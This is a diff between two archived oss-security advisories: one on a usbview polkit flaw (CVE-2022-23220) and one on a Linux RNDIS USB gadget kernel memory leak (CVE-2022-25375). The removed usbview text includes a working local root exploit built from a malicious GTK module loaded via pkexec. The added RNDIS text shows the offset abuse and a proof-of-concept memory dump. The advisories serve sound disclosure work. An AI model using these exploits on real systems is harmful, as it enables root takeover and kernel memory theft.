@@ -1,109 +1,116 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/01/21/1
-Message-ID: <YerETqS+HCN4qz/Z@f195.suse.de>
-Date: Fri, 21 Jan 2022 15:33:50 +0100
-From: Matthias Gerstner <mgerstner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/02/21/1
+Message-ID: <62718b59-2e47-09e9-12df-fced96903a13@gmail.com>
+Date: Mon, 21 Feb 2022 16:16:37 +0100
+From: Szymon Heidrich <szymon.heidrich@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: usbview polkit policy local root exploit (CVE-2022-23220)
+Subject: CVE-2022-25375 : Linux RNDIS USB Gadget memory extraction via packet filter
 Content-Type: text/plain; charset=utf-8
 
-Hello list,
+The RNDIS USB Gadget may be exploited to dump contents
+of kernel memory space via packet filter update mechanism.
 
-this is to inform you about a local root exploit I found in usbview [1]
-release 2.1. This finding was embargoed for 7 days on the linux-distros
-mailing list and the fix has been published today.
+The RNDIS_MSG_SET handler - rndis_set_response - calls gen_ndis_set_resp
+passing a buffer pointer offset by BufOffset + 8. The BufOffset variable
+is retrieved from the RNDIS message and not validated to respect buffer
+boundaries. Consequently by manipulating the four byte InformationBufferOffset
+member of rndis_set_msg_type an attacker may offset the actual buffer by up
+to 0xffffffff bytes.
 
-The upstream author Greg KH is currently working on an improved version
-of usbview that will no longer require root privileges to run.
+rndis.c - rndis_msg_parser
+>	case RNDIS_MSG_QUERY:
+>		return rndis_query_response(params,
+>					(rndis_query_msg_type *)buf);
+>
+>	case RNDIS_MSG_SET:
+>		return rndis_set_response(params, (rndis_set_msg_type *)buf);
 
-Following is the full report:
+rndis.c - rndis_set_response
+> static int rndis_set_response(struct rndis_params *params,
+>			      rndis_set_msg_type *buf)
+>{
+>	u32 BufLength, BufOffset;
+>	rndis_set_cmplt_type *resp;
+>	rndis_resp_t *r;
+>
+>	r = rndis_add_response(params, sizeof(rndis_set_cmplt_type));
+>	if (!r)
+>		return -ENOMEM;
+>	resp = (rndis_set_cmplt_type *)r->buf;
+>
+>	BufLength = le32_to_cpu(buf->InformationBufferLength);
+>	BufOffset = le32_to_cpu(buf->InformationBufferOffset);
+>
+>#ifdef	VERBOSE_DEBUG
+>	pr_debug("%s: Length: %d\n", __func__, BufLength);
+>	pr_debug("%s: Offset: %d\n", __func__, BufOffset);
+>	pr_debug("%s: InfoBuffer: ", __func__);
+>
+>	for (i = 0; i < BufLength; i++) {
+>		pr_debug("%02x ", *(((u8 *) buf) + i + 8 + BufOffset));
+>	}
+>
+>	pr_debug("\n");
+>#endif
+>
+>	resp->MessageType = cpu_to_le32(RNDIS_MSG_SET_C);
+>	resp->MessageLength = cpu_to_le32(16);
+>	resp->RequestID = buf->RequestID; /* Still LE in msg buffer */
+>	if (gen_ndis_set_resp(params, le32_to_cpu(buf->OID),
+>			((u8 *)buf) + 8 + BufOffset, BufLength, r))
+>		resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);
+>	else
+>		resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);
+>
+>	params->resp_avail(params->v);
+>	return 0;
+>}
 
-A polkit policy file has been added to usbview release 2.1 via commit
-'ddefeba' [2] (already contributed in 2016). This policy file allows to
-run usbview as root via Polkit's `pkexec` utility. This is a common
-usage to run GUI applications as root. However, this policy file
-contains problematic authentication settings:
+Next the code responsible for handling RNDIS_OID_GEN_CURRENT_PACKET_FILTER
+OID sets the current packet filter to the value pointed by the buf pointer.
+With the offset applied this allows one to retrieve two bytes at a specified
+address and store the value in the packet filter.
 
-    <allow_any>yes</allow_any>
-    <allow_inactive>yes</allow_inactive>
-    <allow_active>auth_admin_keep</allow_active>
+rndis.c - gen_ndis_set_resp
+>	switch (OID) {
+>	case RNDIS_OID_GEN_CURRENT_PACKET_FILTER:
+>
+>		/* these NDIS_PACKET_TYPE_* bitflags are shared with
+>		 * cdc_filter; it's not RNDIS-specific
+>		 * NDIS_PACKET_TYPE_x == USB_CDC_PACKET_TYPE_x for x in:
+>		 *	PROMISCUOUS, DIRECTED,
+>		 *	MULTICAST, ALL_MULTICAST, BROADCAST
+>		 */
+>		*params->filter = (u16)get_unaligned_le32(buf);
+>		pr_debug("%s: RNDIS_OID_GEN_CURRENT_PACKET_FILTER %08x\n",
+>			__func__, *params->filter);
+>
 
-These settings effectively mean that only a user in a local and active
-(graphical) session needs to enter a root password to run usbview as
-root. Users in inactive (e.g. locked) sessions or arbitrary other users
-(e.g. logged in via SSH) can run usbview as root without providing any
-authentication at all.
+Further step is to retrieve the packet filter value by utilizing a combination
+of USB_CDC_SEND_ENCAPSULATED_COMMAND with RNDIS_MSG_QUERY for the
+RNDIS_OID_GEN_CURRENT_PACKET_FILTER OID and USB_CDC_GET_ENCAPSULATED_RESPONSE
+control transfer requests.
 
-Some further review of this situation showed that this allows for a
-pretty simple local root exploit by passing the `--gtk-module` command
-line parameter to usbview. For example, assuming the local user 'nobody'
-is compromised:
+Repeating the set/get packet filter with incremented InformationBufferOffset
+in the RNDIS request allows extraction of up to 0xffffffff bytes of kernel
+space memory by two bytes at a time. For large amounts of data the process is
+rather slow but still effective.
 
-    # Simulate a compromised nobody account
-    #
-    # This needs to be run outside of a login session, e.g. from an SSH
-    # shell. Alternatively one can use a "sleep 10 && pkexec ..." below
-    # and then switch to another login terminal (like pressing
-    # 'ctrl-alt-f1') during the execution of pkexec to mark the session
-    # as inactive, causing the exploit to work as well.
-    root# sudo -u nobody /bin/bash
+> $ sudo python3 rndisco.py -v 0x1b67 -p 0x400c -l 0x3fffc > /tmp/rpi_rndis.dmp
+> strings /tmp/rpi_rndis.dmp -n8 | tail -n 6
+> stp_proto_unregister
+> <30>Jan 27 14:39:48 dhcpcd[486]: usb0: IAID be:53:70:24
+> <30>Jan 27 14:39:46 dhcpcd[486]: usb0: IAID be:53:70:24
+> <30>Jan 27 14:39:46 dhcpcd[486]: usb0: adding address fe80::6f70:c737:89e:697a
+> <30>Jan 27 14:39:40 dhcpcd[486]: usb0: carrier lost
+> <30>Jan 27 14:39:48 dhcpcd[486]: usb0: adding address fe80::6f70:c737:89e:697a
 
-    # build a simple shared library that executes /bin/bash upon loading
-    nobody$ cd /tmp
-    nobody$ gcc -omymod.so -fPIC -shared -x c - <<END
-    #include <stdio.h>
-    #include <unistd.h>
+References
+- https://github.com/torvalds/linux/commit/38ea1eac7d88072bbffb630e2b3db83ca649b826
+- https://cdn.kernel.org/pub/linux/kernel/v5.x/ChangeLog-5.16.10
+- https://github.com/szymonh/rndis-co
+- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25375
 
-    static void exploit_init() __attribute__((constructor));
 
-    void exploit_init() {
-            execve("/bin/bash", NULL, NULL);
-    }
-    END
-
-    # run usbview via pkexec as root, instructing GTK to load the
-    # exploit library
-    nobody$ pkexec /usr/bin/usbview --gtk-module=/tmp/mymod.so
-    # root shell obtained
-    root #
-
-Because `gtk_init()` loads modules before even attaching to the
-graphical environment, no X11 session or similar is required for this
-exploit to succeed.
-
-The problematic policy file seemingly already has been packaged for a
-longer time in Debian Linux. Ubuntu also used this Debian package. On
-Gentoo Linux the released version 2.1 was already stable and thus
-affected. Fedora uses its own, safe version of the polkit policy file.
-The Arch Linux package was not updated to version 2.1 and was thus not
-affected.
-
-The fix of the policy file itself is simple [3] and another change adds
-a bit of hardening of the polkit invocation on top [4]. The fixes are
-available in upstream release 2.2 [5].
-
-I stumbled over this, because the usbview package in openSUSE Tumbleweed
-wanted an update to version 2.1 and this new polkit policy appeared
-which requires a review by the SUSE security team.
-
-[1]: https://github.com/gregkh/usbview
-[2]: https://github.com/gregkh/usbview/commit/ddefeba3f67d6a6f394eb57352254c1c8a312671
-[3]: https://github.com/gregkh/usbview/commit/bf374fa4e5b9a756789dfd88efa93806a395463b
-[4]: https://github.com/gregkh/usbview/commit/1282782301570b3ee27f82f4f34c2c1a82bfd91a
-[5]: https://github.com/gregkh/usbview/commit/38e9dc56a437721f7a8b0ec1d2b4e611e090c87d
-
-Regards
-
-Matthias
-
--- 
-Matthias Gerstner <matthias.gerstner@...e.de>
-Security Engineer
-https://www.suse.com/security
-GPG Key ID: 0x14C405C971923553
- 
-SUSE Software Solutions Germany GmbH
-HRB 36809, AG Nürnberg
-Geschäftsführer: Ivo Totev
-
-Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
+Best regards,
+Szymon
